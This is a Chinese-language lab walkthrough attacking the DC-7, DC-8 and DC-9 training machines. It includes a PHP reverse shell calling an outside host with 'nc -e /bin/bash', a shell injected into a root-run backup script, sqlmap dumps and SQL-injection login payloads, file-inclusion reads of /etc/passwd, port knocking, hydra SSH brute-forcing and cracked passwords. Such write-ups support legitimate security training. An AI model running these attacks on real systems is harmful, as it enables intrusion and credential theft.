![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775976182588-388aa68d-dae1-4124-91c3-8769cfa7797e.png)

在dc7user的家目录发现mbox内容

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775975412546-ad773e5f-9eee-45f9-8aa2-e4e9ae991372.png)

-->查看`**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/opt/scripts/backups.sh</font>**`

```plain
dc7user@dc-7:~$ ls -ls /opt/scripts/backups.sh
4 -rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh
dc7user@dc-7:~$ cat /opt/scripts/backups.sh
#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775975723878-7cef524a-1570-44db-90d6-c02108289cf4.png)

-->查看属组

`cat /etc/passwd`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775976365592-38f02780-b7e9-4de0-af90-ddda997868a0.png)

-->尝试<font style="color:rgb(15, 17, 21);">PickYourOwnPassword解码website.sql.gpg</font>

<font style="color:rgb(15, 17, 21);">-->用www-data用户组塞入启动shell的命令</font>

<font style="color:rgb(15, 17, 21);">-->查看/home/dc7user/backups/website.sql</font>

**<font style="color:rgb(15, 17, 21);">权限提升</font>**

<font style="color:rgb(15, 17, 21);">-->用</font><font style="color:rgb(15, 17, 21);">PickYourOwnPassword解码gpg文件-->查看</font><font style="color:rgb(15, 17, 21);">/home/dc7user/backups/website.sql</font>

<font style="color:rgb(15, 17, 21);">--></font><font style="color:rgb(15, 17, 21);">用www-data用户组塞入启动shell的命令</font>

**<font style="color:rgb(15, 17, 21);">解码</font>**

```plain
cd backups
gpg --decrypt --passphrase "PickYourOwnPassword" website.sql.gpg > website.sql
#查看建表语句
grep -i "CREATE TABLE.*users" website.sql
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775984262033-c1dc29a8-bde9-4edc-be43-2c1245e6b787.png)

看到关键表

查看表

```plain
grep -A 5 "INSERT INTO \`users_field_data\`" website.sql | head -n 30
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775984450277-b83d3b09-41ef-47cc-a8da-dc288cf8603c.png)

看到关键数据

```plain
admin   -> $S$Ead.KmIcT/yfKC.1H53aDPJasaD7o.ioEGiaPy1lLyXXAJC/Qi4F
dc7user -> $S$EKe0kuKQvFhgFnEYMpq.mRtbl/TQ5FmEjCDxbu0HIHaO0/U.YFjI
```

破解哈希值

```bash
#kali开启监听
nc -lvnp 5555 > hash.txt

#靶机发送数据
echo '$S$Ead.KmIcT/yfKC.1H53aDPJasaD7o.ioEGiaPy1lLyXXAJC/Qi4F' | nc 192.168.43.53 5555

#Drupal 8+ 使用的 $S$ 哈希，在 Hashcat 中对应的模式码是 7900 
#kali
hashcat -m 7900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

但是跑不动,重新思考

-->www-data组可以root启动-->切换到www-data用户-->拿到webshell-->登录后台/user/login/-->已知有后台用户admin登录需要密码

-->破解哈希值×-->durash修改admin密码

**修改密码**

```bash
cd /
cd /var/www/html
#dursh命令修改admin密码
drush user-password admin --password="your_new_password"
```

**getshell**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775985822331-eb5a58f8-4c42-4bd4-9d0e-1fe6a52457c4.png)

文件上传入口-->上传webshell

经过尝试,这个上传点非常难上传webshell

<font style="color:rgb(77, 77, 77);">后面查了一下因为dc7的CMS是Drupal8，已经移除了PHP Filter（php过滤器），后续作为一个模组存在，可以手动安装。在官网找到下载链接，下载之后给 DC-7 安装</font>

<font style="color:rgb(77, 77, 77);">复制文件链接</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775992165386-50922c25-bb63-4b23-8f62-5edc5e4d1919.png)

输入链接

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775992181921-439950bc-6870-4b3f-8e6c-ec96d2c4efd4.png)

extend页面勾选并点击安装

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775992199128-7e9af016-6c19-4866-9825-644964701cc1.png)

在content页面add,选择basic page

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775992237924-91418989-4878-43aa-8f01-3e613584d2fd.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775992290139-2137fed8-6b5f-426a-840c-4af35d98acde.png)

蚁剑连接[http://192.168.43.55/node/5](http://192.168.43.55/node/5)

反弹shell

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775992768169-5d967aaf-f6b5-4f44-bfc5-73e19ca85072.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775992779992-79907fdc-1f8f-4c62-84d1-b246937e88d0.png)

**提权**

```bash
#获得交互式shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
#塞入反弹shell的命令
```

等root执行反弹shell命令

在反弹的shell中找到theflag.txt

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775994571955-8335f460-af09-4133-ae41-696be00c775c.png)

# DC-8
**信息收集**

**端口扫描**

`nmap -p- 192.168.43.57`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1776229756851-4c40c962-783a-4921-b42f-e6a310eb2bc3.png)

+ 开放端口80

**目录扫描**

`python dirsearch.py -u http://192.168.43.57`

+ `**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/CHANGELOG.txt</font>**`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">(状态码: 200)</font><font style="color:rgb(15, 17, 21);">  
</font><font style="color:rgb(15, 17, 21);">包含 Drupal 核心版本号，用于确认具体漏洞范围。</font>
+ `**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/user</font>**`**<font style="color:rgb(15, 17, 21);"> </font>****<font style="color:rgb(15, 17, 21);">与</font>****<font style="color:rgb(15, 17, 21);"> </font>**`**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/user/login</font>**`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">(状态码: 200)</font><font style="color:rgb(15, 17, 21);">  
</font><font style="color:rgb(15, 17, 21);">登录页面，可进行弱口令爆破或用户名枚举。</font>
+ `**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/node</font>**`**<font style="color:rgb(15, 17, 21);"> </font>****<font style="color:rgb(15, 17, 21);">与</font>****<font style="color:rgb(15, 17, 21);"> </font>**`**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/node/1?_format=hal_json</font>**`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">(状态码: 200)</font><font style="color:rgb(15, 17, 21);">  
</font><font style="color:rgb(15, 17, 21);">Drupal 内容节点，可能存在未授权访问的数据泄露。</font>
+ `**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/install.php</font>**`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">(状态码: 200)</font><font style="color:rgb(15, 17, 21);">  
</font>**<font style="color:rgb(15, 17, 21);">极度危险信号</font>**<font style="color:rgb(15, 17, 21);">：安装脚本未禁用，可能允许攻击者重新安装网站或修改数据库配置。</font>
+ `**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/web.config</font>**`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">(状态码: 200)</font><font style="color:rgb(15, 17, 21);">  
</font><font style="color:rgb(15, 17, 21);">服务器配置信息泄露。</font>
+ `**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/views/ajax/autocomplete/user/a</font>**`<font style="color:rgb(15, 17, 21);"> (状态码: 200)  
</font><font style="color:rgb(15, 17, 21);">用户枚举端点（</font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/views/ajax/autocomplete/user/[用户名前缀]</font>`<font style="color:rgb(15, 17, 21);">）。</font>

**指纹识别**

`whatweb 192.168.43.57`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1776229641999-2515d9a1-d14b-4fe6-aa81-4cbe18f6c78e.png)

+ <font style="color:rgb(15, 17, 21);background-color:rgb(237, 243, 254);">MetaGenerator[Drupal 7 (http://drupal.org)</font>

-->已知漏洞

| <font style="color:rgb(15, 17, 21);">漏洞名称 / CVE 编号</font> | <font style="color:rgb(15, 17, 21);">影响版本范围</font> | <font style="color:rgb(15, 17, 21);">漏洞类型</font> | <font style="color:rgb(15, 17, 21);">攻击条件</font> | <font style="color:rgb(15, 17, 21);">核心利用方法 (Kali)</font> |
| --- | --- | --- | --- | --- |
| **<font style="color:rgb(15, 17, 21);">Drupalgeddon 2</font>**<font style="color:rgb(15, 17, 21);">   </font><font style="color:rgb(15, 17, 21);">(CVE-2018-7600)</font> | <font style="color:rgb(15, 17, 21);">7.x < 7.58</font> | **<font style="color:rgb(15, 17, 21);">未认证 RCE</font>** | <font style="color:rgb(15, 17, 21);">无需登录，</font><font style="color:rgb(15, 17, 21);">   </font><font style="color:rgb(15, 17, 21);">默认配置即受影响</font> | `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">exploit/unix/webapp/drupal_drupalgeddon2</font>`<font style="color:rgb(15, 17, 21);">   </font><font style="color:rgb(15, 17, 21);">或 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">searchsploit -m 44449</font>` |
| **<font style="color:rgb(15, 17, 21);">Drupalgeddon 3</font>**<font style="color:rgb(15, 17, 21);">   </font><font style="color:rgb(15, 17, 21);">(CVE-2018-7602)</font> | <font style="color:rgb(15, 17, 21);">7.x < 7.59</font> | **<font style="color:rgb(15, 17, 21);">未认证 RCE</font>** | <font style="color:rgb(15, 17, 21);">绕过 7.58 补丁</font> | `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">exploit/unix/webapp/drupal_drupalgeddon3</font>` |
| **<font style="color:rgb(15, 17, 21);">Drupalgeddon 1</font>**<font style="color:rgb(15, 17, 21);">   </font><font style="color:rgb(15, 17, 21);">(CVE-2014-3704)</font> | <font style="color:rgb(15, 17, 21);">7.x < 7.32</font> | **<font style="color:rgb(15, 17, 21);">SQL 注入</font>** | <font style="color:rgb(15, 17, 21);">无需登录</font> | <font style="color:rgb(15, 17, 21);">可用于修改管理员密码或代码执行</font> |
| **<font style="color:rgb(15, 17, 21);">RESTful Web Services RCE</font>**<font style="color:rgb(15, 17, 21);">   </font><font style="color:rgb(15, 17, 21);">(CVE-2019-6340)</font> | <font style="color:rgb(15, 17, 21);">7.x < 7.62</font> | **<font style="color:rgb(15, 17, 21);">需认证 RCE</font>** | **<font style="color:rgb(15, 17, 21);">前提</font>**<font style="color:rgb(15, 17, 21);">：需开启 REST 模块</font><font style="color:rgb(15, 17, 21);">   </font><font style="color:rgb(15, 17, 21);">需获取低权限 Cookie</font> | <font style="color:rgb(15, 17, 21);">使用</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">exploit/unix/webapp/drupal_restws_unserialize</font>` |


**浏览网页**

+ `http://192.168.43.57/?nid=3`和`http://192.168.43.57/node/3`是同一个界面-->sql注入
+ `http://192.168.43.57/CHANGELOG.txt`-->已知漏洞被修复

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1776230385045-6c512b18-7c0f-4978-82e2-dc952eb8ac96.png)

+ `http://192.168.43.57/user`登录界面-->弱口令/爆破

**漏洞挖掘利用**

**测试**`**http://192.168.43.57/?nid=2**`**sql注入**

`sqlmap -u 'http://192.168.43.57/?nid=2'`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1776247876046-485cb38b-758d-482e-97f4-7cd5d134630c.png)

探测出sql注入

**sqlmap获取数据**

```bash
sqlmap -u 'http://192.168.43.57/?nid=2' --batch --dbs
      available databases [2]:                                                                                
      [*] d7db
      [*] information_schema
sqlmap -u 'http://192.168.43.57/?nid=2' --batch -D d7db --tables
sqlmap -u 'http://192.168.43.57/?nid=2' --batch -D d7db -T users --dump
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1776248271612-13e73f55-a3b7-43d1-88c0-cec14ec9a28a.png)

-->hash破解

-->更新数据

**sqlmap更新数据**

```bash
sqlmap -u "http://192.168.43.57/?nid=2" \
  --dbms=mysql \
  --sql-query="UPDATE users SET pass='$S$DNz8QyYcJpR2PLmGFicKz4BzUa8F8wH2qC8e9CvLr3pM9uV7iB5x' WHERE uid=1"
```

目标不支持堆叠注入,失败

**hash破解**

```bash
# 将哈希保存为 hash.txt
echo 'admin:$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z' > hash.txt
echo 'john:$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF' >> hash.txt

# 使用 rockyou.txt 字典
john --format=drupal7 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

```

密码是`turtle`

-->用john:turtle登录/user

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1776252645810-5eb16088-d9f4-4cb0-97b5-60c5645c16be.png)

**浏览网页**

contactus-->webform-->formsettings 可以执行php

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1776844152981-9e660e41-c64b-4f4a-9512-aaf5b6769543.png)

写入代码

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1776845104471-584cbbd9-460c-46e1-a53d-1183c6f71f7e.png)

随便提交内容

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1776845109300-ec137e43-b132-4b0a-ac9c-2877816b50c6.png)

代码执行

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1776845132473-c5002d85-2ea5-4f4c-8ab9-6481e6de849c.png)

**getshelll**

写入反弹shell

```plain
<?php 
system("nc -e /bin/bash 192.168.10.146 4444");
?>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1776845193332-38235f20-d460-4880-9f7f-168038aee750.png)

开启监听,页面提交内容出发执行代码

获得反弹shell

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1776845276274-d90114d0-33ae-414d-8c50-ceb8442faf92.png)

**内网渗透**

升级tty`python -c 'import pty;pty.spawn("/bin/bash")'`

**信息收集**

`<font style="color:rgb(0, 0, 0);">find / -perm -u=s -type f 2>/dev/null</font>`

<font style="color:rgb(0, 0, 0);">发现/usr/sbin/exim4</font>

`<font style="color:rgb(0, 0, 0);">cat /var/www/html/sites/default/settings.php</font>`

<font style="color:rgb(0, 0, 0);">找到数据库密码用户名：dbuser   密码：4nB90JumP</font>

**<font style="color:rgb(0, 0, 0);">权限提升</font>**

`exim4 --version`

版本是4.89

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1776858076782-aad052e4-713e-4f8f-b2b6-10a3cf95feaf.png)

搜索exp

`searchsploit exim`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1776858262117-2edf6799-10a5-46ac-93f5-c06cf9660135.png)

复制脚本到kali网站根目录

`cp /usr/share/exploitdb/exploits/linux/local/46996.sh /var/www/html`

在webshell中执行

```plain
cd /tmp
wget http://192.168.43.58/var/www/html/46996.sh
```

# DC-9
**信息收集**

**浏览网页**

+ /search.php页面可输入内容查询

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778326183525-8518cc92-78d9-4fa7-8bf3-2ced015ccb2b.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778326185337-a04b913b-e1bb-4ee8-8f86-3051af0409c7.png)

抓包

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778326561354-5d8b3137-b574-41eb-a05f-75506b0c9e87.png)

请求post传递参数,且向/results.php提交

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778326636500-7cb96b31-f7e2-4cdc-8897-b9187cb0ae8f.png)

缺少安全响应头

-->sql注入/xss注入

+ /manage.php登录页面

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778326371815-1dd0ee2a-d3c3-41e8-acc0-2f8ad6538cae.png)

-->sql注入

**端口扫描**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778326910452-8874e47b-96f7-47e9-a077-36e4b96ea7b6.png)

22端口被过滤-->可能需要敲门

**目录扫描**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778327125168-d31d7650-a30d-4a6b-846c-701e75d0ff3b.png)

/index.php/login/-->可能存在路径解析漏洞

**指纹识别**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778328381448-4c0c6337-52e5-4098-b573-098810c16f74.png)

+ **<font style="color:rgb(15, 17, 21);">Web服务器</font>**<font style="color:rgb(15, 17, 21);">：Apache 2.4.38 (Debian)</font>
+ **<font style="color:rgb(15, 17, 21);">操作系统</font>**<font style="color:rgb(15, 17, 21);">：Debian（版本未知，可能为Stretch/Buster）</font>
+ **<font style="color:rgb(15, 17, 21);">编程语言</font>**<font style="color:rgb(15, 17, 21);">：PHP（由</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">.php</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">文件、</font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">config.php</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">等可知）</font>
+ **<font style="color:rgb(15, 17, 21);">前端</font>**<font style="color:rgb(15, 17, 21);">：HTML5，无现代JS框架，极可能是原生PHP手写应用</font>

-->已知漏洞<font style="color:rgb(15, 17, 21);">Apache 2.4.38 (Debian)</font><!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778328421467-65b5a1f2-9add-473a-8e20-524eab4aaa8c.png)

-->/logout.php存在重定向,可能存在 CVE-2019-10098  

-->后台可能有文件上传漏洞--->需要先登录后台

**漏洞挖掘**

**/search.php和/results.php**

**sql注入  
**输入`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">Mary' OR '1'='1</font>`

<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">显示全量</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778328663833-f7594204-830b-451a-bb1d-1f62c2f73dbe.png)

<font style="color:rgb(15, 17, 21);">-->存在sql注入</font>

**<font style="color:rgb(15, 17, 21);">xss</font>**

`<font style="color:rgb(15, 17, 21);"><script>alert(1)</script></font>`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778328733667-b20b06e3-a1c4-468e-af48-48357d89ff05.png)

-->此页面没有xss

**漏洞利用**

**sql注入**

`sqlmap -u "http://192.168.43.60/results.php" --data="search=Mary" --dbs`**   **

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778329457687-baa3c787-3f35-4bfb-8fea-3a4614773721.png)

-->可能登录用户在users

`sqlmap -u "http://192.168.43.60/results.php" --data="search=Mary" -D users --tables`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778329547754-fa3a263c-840b-4758-8196-8767db5ea5dc.png)

`sqlmap -u "http://192.168.43.60/results.php" --data="search=Mary" -D users -T UserDetails --dump`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778329604843-33415842-590e-4c3c-884a-eafa8d336e1b.png)

尝试登录marym:3kfs86sfd登录不上

尝试janitor2:Hawaii-Five-0登录不上

**sql注入绕过登录**

`username=' OR '1'='1' -- -&password=anything`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778391792445-9d5b0ab9-0ab7-4145-89a1-bd770d60c340.png)

不行-->回到漏洞挖掘

**漏洞挖掘**

**重定向路径解析漏洞**

目录扫描中发现/logout.php会重定向到manage.php

CVE-2019-10098 :  
当请求 URL 中注入编码后的换行符 `<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">%0a</font>`（或回车符 `<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">%0d</font>`）时，`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">mod_rewrite</font>` 会错误地截断原始重定向目标，把控制字符后面的内容当成新的跳转地址

`<font style="color:rgb(0, 0, 0);">curl -i "http://192.168.43.60/logout.php%0ahttp://attacker.com"</font>`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778393242029-fe5ff4e4-6ae3-4c89-96a3-006cbe680cc9.png)

虽然重定向但没有跳转到正真的目标网站-->重定向路径解析漏洞不存在

-->先登录后台-->目前只有sql注入-->从数据库中找

**漏洞利用**

换一个数据库

`sqlmap -u "http://192.168.43.60/results.php" --data="search=Mary" -D Staff --tables`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778393734882-2d941325-8bbb-49fe-bf71-e00e1f156dc2.png)

+ sqlmap -u "http://192.168.43.60/results.php" --data="search=Mary" -D Staff -T Users --dump

+--------+--------------------------------------------------+----------+  
| UserID | Password                                         | Username |  
+--------+--------------------------------------------------+----------+  
| 1      | 856f5de590ef37314e7c3bdf6f8a66dc (transorbital1) | admin    |  
+--------+--------------------------------------------------+----------+

+ sqlmap -u "http://192.168.43.60/results.php" --data="search=Mary" -D Staff -T StaffDetails --dump

只有员工信息

-->登录

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778394007786-5d5d6d20-389e-4082-b566-c1a059e4ec21.png)

已经登录

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778563574526-1cafc798-6a37-4b35-b0d7-803c959f1bcf.png)

-->可能存在文件包含

验证`http://192.168.43.60/welcome.php?file=../../../../etc/passwd`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778563663407-71f70385-2d3e-4bb2-9774-a9c4a58eaa69.png)

存在文件包含

**getshell**

**打开端口**

前面扫描ssh端口被过滤-->可能用到端口敲门

查看knockd.conf

`http://192.168.43.60/welcome.php?file=../../../../etc/knockd.conf`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778563990365-8e5a681c-f9d9-479e-8ed7-662f1bb0cf5c.png)

按顺序敲门:<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">7469,8475,9842</font>

```plain
#安装knock工具
apt install knockd

knock -v 192.168.43.60 7469 8475 9842
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778564199484-3c15a417-a5a6-4af8-82d9-30600523e241.png)

ssh端口被打开

**登录ssh**

生成字典

```plain
sqlmap -u "http://192.168.43.60/results.php" --data="search=Mary" --batch -D users 
-T UserDetails -C username,password --dump 

sqlmap -u "http://192.168.43.60/results.php" --data="search=Mary" --batch -D users 
-T UserDetails -C username,password --dump --output-dir=./sqlmap_output

cd ./sqlmap_output/*/dump/users/
awk -F, '{print $1}' UserDetails.csv > username.txt
awk -F, '{print $2}' UserDetails.csv > password.txt
```

**爆破**

```plain
hydra -L username.txt -P password.txt 192.168.43.60 ssh
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778844783759-14c68a83-ba2f-436f-8ad2-5e1f2c28498c.png)

[22][ssh] host: 192.168.43.60   login: chandlerb   password: UrAG0D!

[22][ssh] host: 192.168.43.60   login: joeyt   password: Passw0rd

[22][ssh] host: 192.168.43.60   login: janitor   password: Ilovepeepee

```plain
# 登录 chandlerb
ssh chandlerb@192.168.43.60

# 登录 joeyt
ssh joeyt@192.168.43.60

# 登录 janitor
ssh janitor@192.168.43.60
```

**信息收集**

登录janitor发现秘密文件

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778845668668-faf19502-a4d1-498e-948c-cf5b92af5085.png)

```plain
cd .secrets-for-putin

ls -a
//.  ..  passwords-found-on-post-it-notes.txt
cat passwords-found-on-post-it-notes.txt
```

```plain
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

获得密码文件

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778845919827-7b38ebfd-b45e-4cf9-951e-fb9ff3189d1b.png)

**登录**

把密码放入刚才的密码文件中，再次爆破一下

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1778846199350-f50ea48d-b56a-4b88-a23d-e53e197f19c6.png)

多了一个账号,登录

```plain
ssh fredf@192.168.43.60
B4-Tru3-001
```

**提权**

登录fred

`sudo -l`发现以root执行的文件

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1779710481278-36b6bb90-91aa-41b5-bff7-c734cc4549a3.png)



